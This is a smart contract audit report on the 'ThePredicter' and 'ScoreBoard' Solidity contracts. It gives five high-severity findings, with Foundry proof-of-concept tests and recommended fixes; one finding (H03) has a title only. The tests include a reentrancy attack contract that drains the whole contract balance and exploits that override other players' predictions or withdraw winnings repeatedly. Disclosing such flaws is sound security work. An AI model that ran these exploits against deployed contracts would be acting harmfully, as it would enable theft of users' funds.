# H01: Prediction for a match can be set on behalf of other players.
## Summary
Due to a missing check for the `msg.sender` in `setPrediction()` function, it is possible to override the predictions of other players.
Nothing stops the caller of the function to pass `address player` which is different than himself.

## Vulnerability Details

`setPrediction()` is a public function which can be called by anyone. At the same time it accepts as an argument the address of the player which prediction is going to be changed. This can lead to loss of rewards for honest players, because someone has changed their prediction.

```solidity
 function setPrediction(address player, uint256 matchNumber, Result result) public {
        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400) {
            playersPredictions[player].predictions[matchNumber] = result;
        }

        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (playersPredictions[player].predictions[i] != Result.Pending && playersPredictions[player].isPaid[i]) {
                ++playersPredictions[player].predictionsCount;
            }
        }
    }
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract ThePredicterPocTest is Test {

    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public friend = makeAddr("friend");
    address public stranger = makeAddr("stranger");

    uint256 constant ENTRANCE_FEE = 0.04 ether;
    uint256 constant PREDICTION_FEE = 0.0001 ether;

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(address(scoreBoard), ENTRANCE_FEE, PREDICTION_FEE);
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();

        vm.deal(friend, ENTRANCE_FEE + PREDICTION_FEE);
        vm.deal(stranger, ENTRANCE_FEE);
    }

    function testOverridingPlayersPrediction() public {
        uint8 MATCH_NUMBER = 0;
        vm.prank(friend);
        thePredicter.register{value: ENTRANCE_FEE}();

        vm.prank(stranger);
        thePredicter.register{value: ENTRANCE_FEE}();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(friend);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();

        vm.prank(friend);
        thePredicter.makePrediction{value: PREDICTION_FEE}(MATCH_NUMBER, ScoreBoard.Result.First);

        vm.prank(stranger);
        scoreBoard.setPrediction(friend, MATCH_NUMBER, ScoreBoard.Result.Second);
    }
}

```
## Impact

Honest players can make a correct initial prediction, which might have been overridden by a malicious player, which can lead to loss of rewards for the honest player.
## Tools Used

Manual Review

## Recommendations

Consider adding a check for the passed argument for player. Since the `setPrediction()` is intended to be called directly by players and to be called by the predicter contract, we have to consider those two cases in our check - if the caller is the predicter, we trust the call, and if not, we check if the player argument is the same as the `msg.sender`.

```solidity
function setPrediction(address player, uint256 matchNumber, Result result) public { // @audit-issue player address is  set and function is public 
        if(msg.sender != thePredicter && player != msg.sender) {
	        revert();
        }
        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400) {
            playersPredictions[player].predictions[matchNumber] = result;
        }

        // @audit what happens if betting time has passed
        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (playersPredictions[player].predictions[i] != Result.Pending && playersPredictions[player].isPaid[i]) {
                ++playersPredictions[player].predictionsCount;
            }
        }
    }
```




# H02: Reentrancy in cancelRegistration() can lead to funds draining
## Summary
`cancelRegistration()` in `ThePredicter.sol` allows not approved users to withdraw their entrance fee, but due to a reentrancy vulnerability in the function, all balance of the contract can be drained
## Vulnerability Details

`cancelRegistration` does not follow the "Checks-Effects-Interactions" pattern which leads to a reentrancy vulnerability: 
First, we send the ether to the unapproved player and then we update the state. If the recipient of the funds is a malicious contract, it can take advantage of the receive hook and execute the cancelRegistration again until there are enough funds.
```solidity
 function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
            playersStatus[msg.sender] = Status.Canceled;
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```

```solidity
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract MaliciousUser {
    address thePredicter;
    uint256 entranceFee;

    constructor(address _thePredicter, uint256 _entranceFee) {
        thePredicter = _thePredicter;
        entranceFee = _entranceFee;
    }

    function pwn() external {
        ThePredicter(thePredicter).register{value: entranceFee}();
        ThePredicter(thePredicter).cancelRegistration();
    }

    receive() external payable {
        if (thePredicter.balance >= entranceFee) {
            ThePredicter(thePredicter).cancelRegistration();
        }
    }
}

contract ThePredicterPocTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public friend = makeAddr("friend");
    address public stranger = makeAddr("stranger");

    uint256 constant ENTRANCE_FEE = 0.04 ether;
    uint256 constant PREDICTION_FEE = 0.0001 ether;

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(address(scoreBoard), ENTRANCE_FEE, PREDICTION_FEE);
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();

        vm.deal(friend, ENTRANCE_FEE * 2);
        vm.deal(stranger, ENTRANCE_FEE);
    }

    function testReentrancy() public {
        for (uint256 i; i < 10; ++i) {
            address user = makeAddr(string(abi.encodePacked("user", i)));
            vm.deal(user, ENTRANCE_FEE);
            vm.prank(user);
            thePredicter.register{value: ENTRANCE_FEE}();
        }

        MaliciousUser malUser = new MaliciousUser(address(thePredicter), ENTRANCE_FEE);
        vm.deal(address(malUser), ENTRANCE_FEE);
        malUser.pwn();

        vm.assertEq(address(thePredicter).balance, 0);
        vm.assertEq(address(malUser).balance, ENTRANCE_FEE * 11);
    }
}
```
## Impact

All funds of the contract can be drained because of this issue.

## Tools Used

Manual review.

## Recommendations

Consider implementing the "Checks-Effects-Interactions" pattern - we should first update the state and then make external call to send ether. This will mitigate the vulnerability.

```solidity
    function cancelRegistration() public {
        if (playersStatus[msg.sender] == Status.Pending) {
+	        playersStatus[msg.sender] = Status.Canceled;
            (bool success, ) = msg.sender.call{value: entranceFee}("");
            require(success, "Failed to withdraw");
            return;
        }
        revert ThePredicter__NotEligibleForWithdraw();
    }
```


# H03: Players with exactly one prediction wont be able to withdraw winnings

# H04: Players can withdraw winnings multiple times
## Summary
After matches are over and results are set players can withdraw their winnings based on the correctness of their prediction. It is intended to withdraw all winning at once.
It is possible to withdraw winnings multiple times thus taking more than the user should receive and in the same time other users wont be able to take out their winnings.

## Vulnerability Details

Withdrawal of winnings depends on `scoreBoard.isEligibleForReward()` function which checks if the result for the last match is set and if the player has more than one predictions. Predictions count is set to 0 in order to stop users to make multiple withdrawals, but this check can be passed by calling the `setPrediction()` function in `ScoreBoard.sol`.

```solidity
 function withdraw() public {
        if (!scoreBoard.isEligibleForReward(msg.sender)) {
            revert ThePredicter__NotEligibleForWithdraw();
        }
        
        ...
        
        if (reward > 0) {
            scoreBoard.clearPredictionsCount(msg.sender);
            (bool success, ) = msg.sender.call{value: reward}("");
            require(success, "Failed to withdraw");
        }
    }
```

```solidity
function isEligibleForReward(address player) public view returns (bool) {
        return results[NUM_MATCHES - 1] != Result.Pending && playersPredictions[player].predictionsCount > 1;
    }    
```

```solidity
function clearPredictionsCount(address player) public onlyThePredicter {
        playersPredictions[player].predictionsCount = 0;
    }
```

```solidity
 function setPrediction(address player, uint256 matchNumber, Result result) public { 
        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400) {
            playersPredictions[player].predictions[matchNumber] = result;
        }

        playersPredictions[player].predictionsCount = 0;
        for (uint256 i = 0; i < NUM_MATCHES; ++i) {
            if (playersPredictions[player].predictions[i] != Result.Pending && playersPredictions[player].isPaid[i]) {
                ++playersPredictions[player].predictionsCount; // predictionsCount can be updated after being cleared
            }
        }
    }
```
## Impact

This can lead to a malicious player draining the funds of the contract and making other players unable to withdraw anything.
## Tools Used

Manual review
## Recommendations
Consider refactoring the whole function to:
 - revert if predictions are closed
 - update the predictions count only if there is a new prediction
 - for already predicted matches leave the count untouched
```solidity
function setPrediction(address player, uint256 matchNumber, Result result) public { 
        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert("Predictions closed");
        }
        if(result == Result.Pending) {
	        revert("Incorrect match outcome");
        }
        
        bool isFirstPrediction = playersPredictions[player].predictions[matchNumber] == Result.Pending;
		playersPredictions[player].predictions[matchNumber] = result;
		if(isFirstPrediction) {
			++playersPredictions[player].predictionsCount;
		}
    }
```


# H05: Users can do predictions and get rewards without paying for registration

## Summary

There is no restrictions for users to make predictions without paying entrance fee and without approval from the organizer. This is in detriment for honest players which has paid entrance fee which then can be distributed in rewards for the dishonest users.

## Vulnerability Details

`makePrediction()` function does not have any access control thus allowing everyone to make a prediction for upcoming match and get rewards in the end of the tournament.

```solidity
function makePrediction(uint256 matchNumber, ScoreBoard.Result prediction) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract ThePredicterPocTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public friend = makeAddr("friend");
    address public stranger = makeAddr("stranger");

    uint256 constant ENTRANCE_FEE = 0.04 ether;
    uint256 constant PREDICTION_FEE = 0.0001 ether;

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(address(scoreBoard), ENTRANCE_FEE, PREDICTION_FEE);
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();

        vm.deal(friend, ENTRANCE_FEE);
        vm.deal(stranger, ENTRANCE_FEE * 2);
    }

    function testNonRegisteredUserPredictions() public {
        vm.prank(friend);
        thePredicter.register{value: ENTRANCE_FEE}();

        uint256 balanceBeforePredictions = stranger.balance;
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(1, ScoreBoard.Result.Draw);
        thePredicter.makePrediction{value: 0.0001 ether}(2, ScoreBoard.Result.Draw);
        thePredicter.makePrediction{value: 0.0001 ether}(3, ScoreBoard.Result.Draw);

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.Draw);
        scoreBoard.setResult(1, ScoreBoard.Result.Draw);
        scoreBoard.setResult(2, ScoreBoard.Result.Draw);
        scoreBoard.setResult(3, ScoreBoard.Result.Draw);
        scoreBoard.setResult(4, ScoreBoard.Result.Draw);
        scoreBoard.setResult(5, ScoreBoard.Result.Draw);
        scoreBoard.setResult(6, ScoreBoard.Result.Draw);
        scoreBoard.setResult(7, ScoreBoard.Result.Draw);
        scoreBoard.setResult(8, ScoreBoard.Result.Draw);
        vm.stopPrank();

        vm.prank(stranger);
        thePredicter.withdraw();
        uint256 balanceAfterPredictions = stranger.balance;
        console.log(balanceAfterPredictions);
        vm.assertGt(balanceAfterPredictions, balanceBeforePredictions);
    }
}
```
## Impact

Dishonest users will take part of the pot created by entrance fees, which will have negative impact on honest users.
## Tools Used

Manual review.
## Recommendations

Consider adding a check if the user making a prediction is approved by the organizer.

```solidity
 function makePrediction(uint256 matchNumber, ScoreBoard.Result prediction) public payable {
        if (msg.value != predictionFee) {
            revert ThePredicter__IncorrectPredictionFee();
        }
        
+       if (playersStatus[msg.sender] != Status.Approved) {
+           revert("Not approved users cannot make predictions"); 
+       }

        if (block.timestamp > START_TIME + matchNumber * 68400 - 68400) {
            revert ThePredicter__PredictionsAreClosed();
        }

        scoreBoard.confirmPredictionPayment(msg.sender, matchNumber);
        scoreBoard.setPrediction(msg.sender, matchNumber, prediction);
    }
```

